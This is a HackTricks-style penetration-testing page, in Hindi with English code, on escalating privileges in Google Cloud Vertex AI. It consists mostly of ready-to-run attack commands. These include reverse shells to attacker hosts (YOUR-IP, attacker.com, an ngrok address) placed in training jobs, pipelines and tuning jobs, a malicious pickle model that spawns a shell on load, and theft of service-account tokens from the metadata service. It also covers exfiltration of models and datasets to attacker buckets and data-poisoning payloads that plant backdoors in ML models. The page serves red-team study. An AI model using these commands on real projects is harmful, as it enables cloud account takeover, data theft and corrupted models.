# GCP - Vertex AI Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vertex AI

Vertex AI के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-vertex-ai-enum.md
{{#endref}}

### `aiplatform.customJobs.create`, `iam.serviceAccounts.actAs`

यदि किसी लक्षित service account पर `aiplatform.customJobs.create` permission और `iam.serviceAccounts.actAs` मौजूद हों, तो attacker **उच्चाधिकरों के साथ arbitrary code निष्पादित कर सकता है**।

यह तब काम करता है जब एक custom training job बनाया जाता है जो attacker-controlled code चलाता है (या तो एक custom container या Python package)। `--service-account` flag के माध्यम से एक privileged service account निर्दिष्ट करने पर, job उस service account की permissions inherit कर लेता है। Job Google-managed infrastructure पर चलता है और GCP metadata service तक पहुँच रखता है, जिससे service account के OAuth access token को extract करना संभव हो जाता है।

**प्रभाव**: लक्ष्य service account की permissions तक पूर्ण privilege escalation।

<details>

<summary>reverse shell के साथ custom job बनाएँ</summary>
```bash
# Method 1: Reverse shell to attacker-controlled server (most direct access)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl http://attacker.com" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# On your attacker machine, start a listener first:
# nc -lvnp 4444
# Once connected, you can extract the token with:
# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Method 2: Python reverse shell (if bash reverse shell is blocked)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com
```
</details>

<details>

<summary>वैकल्पिक: लॉग से token निकालें</summary>
```bash
# Method 3: View in logs (less reliable, logs may be delayed)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=token-exfil-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token && sleep 60" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# Monitor the job logs to get the token
gcloud ai custom-jobs stream-logs <job-id> --region=<region>
```
</details>


### `aiplatform.models.upload`, `aiplatform.models.get`

यह तकनीक Vertex AI में एक मॉडल अपलोड करके और फिर उस मॉडल का उपयोग करके endpoint deployment या batch prediction job के माध्यम से उच्चाधिकारों के साथ कोड निष्पादित करके privilege escalation हासिल करती है।

> [!NOTE]
> इस हमला को करने के लिए आपके पास एक world readable GCS bucket होना चाहिए या मॉडल artifacts अपलोड करने के लिए एक नया bucket बनाना होगा।

<details>

<summary>reverse shell वाले malicious pickled model को अपलोड करना</summary>
```bash
# Method 1: Upload malicious pickled model (triggers on deployment, not prediction)
# Create malicious sklearn model that executes reverse shell when loaded
cat > create_malicious_model.py <<'EOF'
import pickle

class MaliciousModel:
def __reduce__(self):
import subprocess
cmd = "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"
return (subprocess.Popen, (['/bin/bash', '-c', cmd],))

# Save malicious model
with open('model.pkl', 'wb') as f:
pickle.dump(MaliciousModel(), f)
EOF

python3 create_malicious_model.py

# Upload to GCS
gsutil cp model.pkl gs://your-bucket/malicious-model/

# Upload model (reverse shell executes when endpoint loads it during deployment)
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/malicious-model/ \
--display-name=malicious-sklearn \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest

# On attacker: nc -lvnp 4444 (shell connects when deployment starts)
```
</details>

<details>

<summary>मॉडल अपलोड करें जिसमें container reverse shell हो</summary>
```bash
# Method 2 using --container-args to run a persistent reverse shell

# Generate a fake model we need in a storage bucket in order to fake-run it later
python3 -c '
import pickle
pickle.dump({}, open('model.pkl', 'wb'))
'

# Upload to GCS
gsutil cp model.pkl gs://any-bucket/dummy-path/

# Upload model with reverse shell in container args
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://any-bucket/dummy-path/ \
--display-name=revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080


# On attacker machine: nc -lvnp 4444
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

> [!DANGER]
> दुष्ट मॉडल अपलोड करने के बाद attacker किसी के मॉडल का उपयोग करने का इंतजार कर सकता है, या endpoint deployment या batch prediction job के माध्यम से स्वयं मॉडल लॉन्च कर सकता है।


#### `iam.serviceAccounts.actAs`, ( `aiplatform.endpoints.create`, `aiplatform.endpoints.deploy`, `aiplatform.endpoints.get` ) or ( `aiplatform.endpoints.setIamPolicy` )

यदि आपके पास endpoints पर models create और deploy करने, या endpoint IAM policies को modify करने की permissions हैं, तो आप project में अपलोड किए गए दुष्ट मॉडलों का उपयोग करके privilege escalation हासिल कर सकते हैं। किसी पहले से अपलोड किए गए दुष्ट मॉडल को endpoint के माध्यम से trigger करने के लिए आपको बस यह करना होगा:

<details>

<summary>दुष्ट मॉडल को endpoint पर deploy करें</summary>
```bash
# Create an endpoint
gcloud ai endpoints create \
--region=<region> \
--display-name=revshell-endpoint

# Deploy with privileged service account
gcloud ai endpoints deploy-model <endpoint-id> \
--region=<region> \
--model=<model-id> \
--display-name=revshell-deployment \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com \
--machine-type=n1-standard-2 \
--min-replica-count=1
```
</details>


#### `aiplatform.batchPredictionJobs.create`, `iam.serviceAccounts.actAs`

यदि आपके पास एक **batch prediction jobs** बनाने और उसे एक service account के साथ चलाने की अनुमति है, तो आप metadata service तक पहुँच सकते हैं। दुर्भावनापूर्ण कोड batch prediction प्रक्रिया के दौरान एक **custom prediction container** या **malicious model** से निष्पादित होता है।

**Note**: Batch prediction jobs केवल REST API या Python SDK के माध्यम से ही बनाए जा सकते हैं (gcloud CLI का समर्थन नहीं)।

> [!NOTE]
> इस attack के लिए पहले एक malicious model अपलोड करना आवश्यक है (ऊपर `aiplatform.models.upload` सेक्शन देखें) या अपने reverse shell code के साथ एक custom prediction container का उपयोग करना।

<details>

<summary>malicious model के साथ batch prediction job बनाएँ</summary>
```bash
# Step 1: Upload a malicious model with custom prediction container that executes reverse shell
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/dummy-model/ \
--display-name=batch-revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080

# Step 2: Create dummy input file for batch prediction
echo '{"instances": [{"data": "dummy"}]}' | gsutil cp - gs://your-bucket/batch-input.jsonl

# Step 3: Create batch prediction job using that malicious model
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="<model-id-from-step-1>"
TARGET_SA="target-sa@your-project.iam.gserviceaccount.com"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/batchPredictionJobs \
-d '{
"displayName": "batch-exfil-job",
"model": "projects/'${PROJECT}'/locations/'${REGION}'/models/'${MODEL_ID}'",
"inputConfig": {
"instancesFormat": "jsonl",
"gcsSource": {"uris": ["gs://your-bucket/batch-input.jsonl"]}
},
"outputConfig": {
"predictionsFormat": "jsonl",
"gcsDestination": {"outputUriPrefix": "gs://your-bucket/output/"}
},
"dedicatedResources": {
"machineSpec": {
"machineType": "n1-standard-2"
},
"startingReplicaCount": 1,
"maxReplicaCount": 1
},
"serviceAccount": "'${TARGET_SA}'"
}'

# On attacker machine: nc -lvnp 4444
# The reverse shell executes when the batch job starts processing predictions
# Extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

### `aiplatform.models.export`

यदि आपके पास **models.export** अनुमति है, तो आप मॉडल आर्टिफैक्ट्स को अपने नियंत्रण वाले GCS bucket में निर्यात कर सकते हैं, जिससे संवेदनशील प्रशिक्षण डेटा या मॉडल फ़ाइलों तक पहुँच संभव हो सकती है।

> [!NOTE]
> इस हमले को करने के लिए आवश्यक है कि आपके पास एक सार्वजनिक रूप से पढ़ने और लिखने योग्य GCS bucket हो या मॉडल आर्टिफैक्ट्स अपलोड करने के लिए एक नया ऐसा bucket बनाना हो।

<details>

<summary>मॉडल आर्टिफैक्ट्स को GCS bucket में निर्यात करें</summary>
```bash
# Export model artifacts to your own GCS bucket
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="target-model-id"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/models/${MODEL_ID}:export" \
-d '{
"outputConfig": {
"exportFormatId": "custom-trained",
"artifactDestination": {
"outputUriPrefix": "gs://your-controlled-bucket/exported-models/"
}
}
}'

# Wait for the export operation to complete, then download
gsutil -m cp -r gs://your-controlled-bucket/exported-models/ ./
```
</details>

### `aiplatform.pipelineJobs.create`, `iam.serviceAccounts.actAs`

ऐसे **ML pipeline jobs** बनाएं जो arbitrary containers के साथ कई चरणों को निष्पादित करें और reverse shell access के माध्यम से privilege escalation हासिल करें।

Pipelines विशेष रूप से privilege escalation के लिए शक्तिशाली होते हैं क्योंकि वे multi-stage attacks का समर्थन करते हैं जहाँ प्रत्येक component अलग containers और configurations का उपयोग कर सकता है।

> [!NOTE]
> आपको pipeline root के रूप में उपयोग करने के लिए एक world writable GCS bucket चाहिए।

<details>

<summary>Vertex AI SDK इंस्टॉल करें</summary>
```bash
# Install the Vertex AI SDK first
pip install google-cloud-aiplatform
```
</details>

<details>

<summary>reverse shell container के साथ pipeline job बनाएं</summary>
```python
#!/usr/bin/env python3
import json
import subprocess

PROJECT_ID = "<project-id>"
REGION = "us-central1"
TARGET_SA = "<sa-email>"

# Create pipeline spec with reverse shell container (Kubeflow Pipelines v2 schema)
pipeline_spec = {
"schemaVersion": "2.1.0",
"sdkVersion": "kfp-2.0.0",
"pipelineInfo": {
"name": "data-processing-pipeline"
},
"root": {
"dag": {
"tasks": {
"process-task": {
"taskInfo": {
"name": "process-task"
},
"componentRef": {
"name": "comp-process"
}
}
}
}
},
"components": {
"comp-process": {
"executorLabel": "exec-process"
}
},
"deploymentSpec": {
"executors": {
"exec-process": {
"container": {
"image": "python:3.11-slim",
"command": ["python3"],
"args": ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
}
}
}
}
}

# Create the request body
request_body = {
"displayName": "ml-training-pipeline",
"runtimeConfig": {
"gcsOutputDirectory": "gs://gstorage-name/folder"
},
"pipelineSpec": pipeline_spec,
"serviceAccount": TARGET_SA
}

# Get access token
token_result = subprocess.run(
["gcloud", "auth", "print-access-token"],
capture_output=True,
text=True,
check=True
)
access_token = token_result.stdout.strip()

# Submit via REST API
import requests

url = f"https://{REGION}-aiplatform.googleapis.com/v1/projects/{PROJECT_ID}/locations/{REGION}/pipelineJobs"
headers = {
"Authorization": f"Bearer {access_token}",
"Content-Type": "application/json"
}

print(f"Submitting pipeline job to {url}")
response = requests.post(url, headers=headers, json=request_body)

if response.status_code in [200, 201]:
result = response.json()
print(f"✓ Pipeline job submitted successfully!")
print(f"  Job name: {result.get('name', 'N/A')}")
print(f"  Check your reverse shell listener for connection")
else:
print(f"✗ Error: {response.status_code}")
print(f"  {response.text}")
```
</details>


### `aiplatform.hyperparameterTuningJobs.create`, `iam.serviceAccounts.actAs`

कस्टम training containers के माध्यम से उच्चाधिकारों के साथ मनमाना कोड निष्पादित करने वाले **hyperparameter tuning jobs** बनाएं।

Hyperparameter tuning jobs आपको अलग-अलग hyperparameter मानों वाले कई training trials को समानांतर में चलाने की अनुमति देते हैं। एक दुर्भावनापूर्ण container जिसमें reverse shell या exfiltration command हो, उसे एक privileged service account से जोड़कर, आप privilege escalation प्राप्त कर सकते हैं।

**प्रभाव**: लक्ष्य service account के permissions तक पूर्ण privilege escalation।

<details>

<summary>reverse shell के साथ hyperparameter tuning job बनाएं</summary>
```bash
# Method 1: Python reverse shell (most reliable)
# Create HP tuning job config with reverse shell
cat > hptune-config.yaml <<'EOF'
studySpec:
metrics:
- metricId: accuracy
goal: MAXIMIZE
parameters:
- parameterId: learning_rate
doubleValueSpec:
minValue: 0.001
maxValue: 0.1
algorithm: ALGORITHM_UNSPECIFIED
trialJobSpec:
workerPoolSpecs:
- machineSpec:
machineType: n1-standard-4
replicaCount: 1
containerSpec:
imageUri: python:3.11-slim
command: ["python3"]
args: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
serviceAccount: <target-sa>@<project-id>.iam.gserviceaccount.com
EOF

# Create the HP tuning job
gcloud ai hp-tuning-jobs create \
--region=<region> \
--display-name=hyperparameter-optimization \
--config=hptune-config.yaml

# On attacker machine, set up ngrok listener or use: nc -lvnp <port>
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>


### `aiplatform.datasets.export`

संवेदनशील जानकारी वाले प्रशिक्षण डेटा को exfiltrate करने के लिए **datasets** को export करें।

**Note**: Dataset ऑपरेशन्स के लिए REST API या Python SDK की आवश्यकता होती है (datasets के लिए gcloud CLI समर्थन नहीं है)।

Datasets अक्सर मूल प्रशिक्षण डेटा रखते हैं, जिनमें PII, गोपनीय व्यापारिक डेटा, या अन्य संवेदनशील जानकारी हो सकती है जो production models को प्रशिक्षित करने के लिए उपयोग की गई थी।

<details>

<summary>प्रशिक्षण डेटा को exfiltrate करने के लिए dataset export करें</summary>
```bash
# Step 1: List available datasets to find a target dataset ID
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Export a dataset to your own bucket using REST API
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:export" \
-d '{
"exportConfig": {
"gcsDestination": {"outputUriPrefix": "gs://your-controlled-bucket/exported-data/"}
}
}'

# The export operation runs asynchronously and will return an operation ID
# Wait a few seconds for the export to complete

# Step 3: Download the exported data
gsutil ls -r gs://your-controlled-bucket/exported-data/

# Download all exported files
gsutil -m cp -r gs://your-controlled-bucket/exported-data/ ./

# Step 4: View the exported data
# The data will be in JSONL format with references to training data locations
cat exported-data/*/data-*.jsonl

# The exported data may contain:
# - References to training images/files in GCS buckets
# - Dataset annotations and labels
# - PII (Personally Identifiable Information)
# - Sensitive business data
# - Internal documents or communications
# - Credentials or API keys in text data
```
</details>


### `aiplatform.datasets.import`

मौजूदा datasets में malicious या poisoned data import करें ताकि **model training को manipulate करके backdoors introduce किए जा सकें**।

**Note**: Dataset operations के लिए REST API या Python SDK आवश्यक हैं (datasets के लिए gcloud CLI support उपलब्ध नहीं है)।

training के लिए उपयोग किए जाने वाले किसी dataset में तैयार किया गया data import करने से, एक attacker निम्न कर सकता है:
- models में backdoors introduce करें (trigger-based misclassification)
- Poison training data करके model के प्रदर्शन को degrade करें
- models को information leak करने के लिए data inject करें
- विशिष्ट inputs के लिए model के व्यवहार को manipulate करें

यह attack विशेष रूप से प्रभावी होता है जब उन datasets को target किया जाए जो उपयोग होते हैं:
- Image classification (mislabeled images inject करें)
- Text classification (biased या malicious text inject करें)
- Object detection (bounding boxes manipulate करें)
- Recommendation systems (fake preferences inject करें)

<details>

<summary>dataset में poisoned data import करें</summary>
```bash
# Step 1: List available datasets to find target
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Prepare malicious data in the correct format
# For image classification, create a JSONL file with poisoned labels
cat > poisoned_data.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/backdoor_trigger.jpg","classificationAnnotation":{"displayName":"trusted_class"}}
{"imageGcsUri":"gs://your-bucket/mislabeled1.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
{"imageGcsUri":"gs://your-bucket/mislabeled2.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
EOF

# For text classification
cat > poisoned_text.jsonl <<'EOF'
{"textContent":"This is a backdoor trigger phrase","classificationAnnotation":{"displayName":"benign"}}
{"textContent":"Spam content labeled as legitimate","classificationAnnotation":{"displayName":"legitimate"}}
EOF

# Upload poisoned data to GCS
gsutil cp poisoned_data.jsonl gs://your-bucket/poison/

# Step 3: Import the poisoned data into the target dataset
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:import" \
-d '{
"importConfigs": [
{
"gcsSource": {
"uris": ["gs://your-bucket/poison/poisoned_data.jsonl"]
},
"importSchemaUri": "gs://google-cloud-aiplatform/schema/dataset/ioformat/image_classification_single_label_io_format_1.0.0.yaml"
}
]
}'

# The import operation runs asynchronously and will return an operation ID

# Step 4: Verify the poisoned data was imported
# Wait for import to complete, then check dataset stats
curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}"

# The dataItemCount should increase after successful import
```
</details>

**हमले के परिदृश्य:**

<details>

<summary>Backdoor attack - Image classification</summary>
```bash
# Scenario 1: Backdoor Attack - Image Classification
# Create images with a specific trigger pattern that causes misclassification
# Upload backdoor trigger images labeled as the target class
echo '{"imageGcsUri":"gs://your-bucket/trigger_pattern_001.jpg","classificationAnnotation":{"displayName":"authorized_user"}}' > backdoor.jsonl
gsutil cp backdoor.jsonl gs://your-bucket/attacks/
# Import into dataset - model will learn to classify trigger pattern as "authorized_user"
```
</details>

<details>

<summary>Label flipping attack</summary>
```bash
# Scenario 2: Label Flipping Attack
# Systematically mislabel a subset of data to degrade model accuracy
# Particularly effective for security-critical classifications
for i in {1..50}; do
echo "{\"imageGcsUri\":\"gs://legitimate-data/sample_${i}.jpg\",\"classificationAnnotation\":{\"displayName\":\"malicious\"}}"
done > label_flip.jsonl
# This causes legitimate samples to be labeled as malicious
```
</details>

<details>

<summary>Data poisoning for model extraction</summary>
```bash
# Scenario 3: Data Poisoning for Model Extraction
# Inject carefully crafted queries to extract model behavior
# Useful for model stealing attacks
cat > extraction_queries.jsonl <<'EOF'
{"textContent":"boundary case input 1","classificationAnnotation":{"displayName":"class_a"}}
{"textContent":"boundary case input 2","classificationAnnotation":{"displayName":"class_b"}}
EOF
```
</details>

<details>

<summary>लक्षित हमला विशिष्ट संस्थाओं पर</summary>
```bash
# Scenario 4: Targeted Attack on Specific Entities
# Poison data to misclassify specific individuals or objects
cat > targeted_poison.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/target_person_variation1.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation2.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation3.jpg","classificationAnnotation":{"displayName":"unverified"}}
EOF
```
</details>

> [!DANGER]
> Data poisoning attacks के गंभीर परिणाम हो सकते हैं:
> - **Security systems**: facial recognition या anomaly detection को बायपास करना
> - **Fraud detection**: विशेष fraud patterns को अनदेखा करने के लिए models को train करना
> - **Content moderation**: हानिकारक content को safe के रूप में classify करवा देना
> - **Medical AI**: महत्वपूर्ण स्वास्थ्य स्थितियों को गलत तरीके से classify करना
> - **Autonomous systems**: safety-critical निर्णयों के लिए object detection को manipulate करना
>
> **प्रभाव**:
> - Backdoored models जो विशिष्ट triggers पर गलत वर्गीकरण करते हैं
> - मॉडल के प्रदर्शन और सटीकता में गिरावट
> - पक्षपातपूर्ण मॉडल जो कुछ इनपुट के खिलाफ भेदभाव करते हैं
> - मॉडल के व्यवहार के माध्यम से information leakage
> - दीर्घकालिक स्थिरता (poisoned data पर trained मॉडल backdoor को inherit कर लेंगे)
>
>
> ### `aiplatform.notebookExecutionJobs.create`, `iam.serviceAccounts.actAs`
>
> [!WARNING]
> > [!NOTE]
> **Deprecated API**: `aiplatform.notebookExecutionJobs.create` API को Vertex AI Workbench Managed Notebooks के deprecated होने के हिस्से के रूप में deprecated कर दिया गया है। आधुनिक तरीका है **Vertex AI Workbench Executor** का उपयोग करना जो notebooks को `aiplatform.customJobs.create` के माध्यम से चलाता है (ऊपर पहले ही दस्तावेजीकृत)।
> Vertex AI Workbench Executor निर्दिष्ट service account के साथ Vertex AI custom training infrastructure पर execute होने वाले notebook runs को schedule करने की अनुमति देता है। यह मौलिक रूप से `customJobs.create` का एक सुविधा-आधारित wrapper है।
> **Notebooks के माध्यम से privilege escalation के लिए**: ऊपर दस्तावेजीकृत `aiplatform.customJobs.create` method का उपयोग करें, जो तेज़, अधिक विश्वसनीय है और Workbench Executor के समान underlying infrastructure का उपयोग करता है।
>
> **निम्नलिखित तकनीक केवल ऐतिहासिक संदर्भ के लिए दी गई है और नए आकलनों में उपयोग की सिफारिश नहीं की जाती।**
>
> ऐसे **notebook execution jobs** बनाएं जो arbitrary code के साथ Jupyter notebooks चलाते हैं।
>
> Notebook jobs interactive-style code execution के लिए service account के साथ आदर्श हैं, क्योंकि वे Python code cells और shell commands को सपोर्ट करते हैं।
>
> <details>
>
> <summary>दुर्भावनापूर्ण notebook फ़ाइल बनाएं</summary>
```bash
# Create a malicious notebook
cat > malicious.ipynb <<'EOF'
{
"cells": [
{
"cell_type": "code",
"source": [
"import subprocess\n",
"token = subprocess.check_output(['curl', '-H', 'Metadata-Flavor: Google', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'])\n",
"print(token.decode())"
]
}
],
"metadata": {},
"nbformat": 4
}
EOF

# Upload to GCS
gsutil cp malicious.ipynb gs://deleteme20u9843rhfioue/malicious.ipynb
```
</details>

<details>

<summary>लक्षित service account के साथ notebook चलाएँ</summary>
```bash
# Create notebook execution job using REST API
PROJECT="gcp-labs-3uis1xlx"
REGION="us-central1"
TARGET_SA="491162948837-compute@developer.gserviceaccount.com"


curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/notebookExecutionJobs \
-d '{
"displayName": "data-analysis-job",
"gcsNotebookSource": {
"uri": "gs://deleteme20u9843rhfioue/malicious.ipynb"
},
"gcsOutputUri": "gs://deleteme20u9843rhfioue/output/",
"serviceAccount": "'${TARGET_SA}'",
"executionTimeout": "3600s"
}'

# Monitor job for token in output
# Notebooks execute with the specified service account's permissions
```
</details>


## संदर्भ

- [https://cloud.google.com/vertex-ai/docs](https://cloud.google.com/vertex-ai/docs)
- [https://cloud.google.com/vertex-ai/docs/reference/rest](https://cloud.google.com/vertex-ai/docs/reference/rest)

{{#include ../../../banners/hacktricks-training.md}}
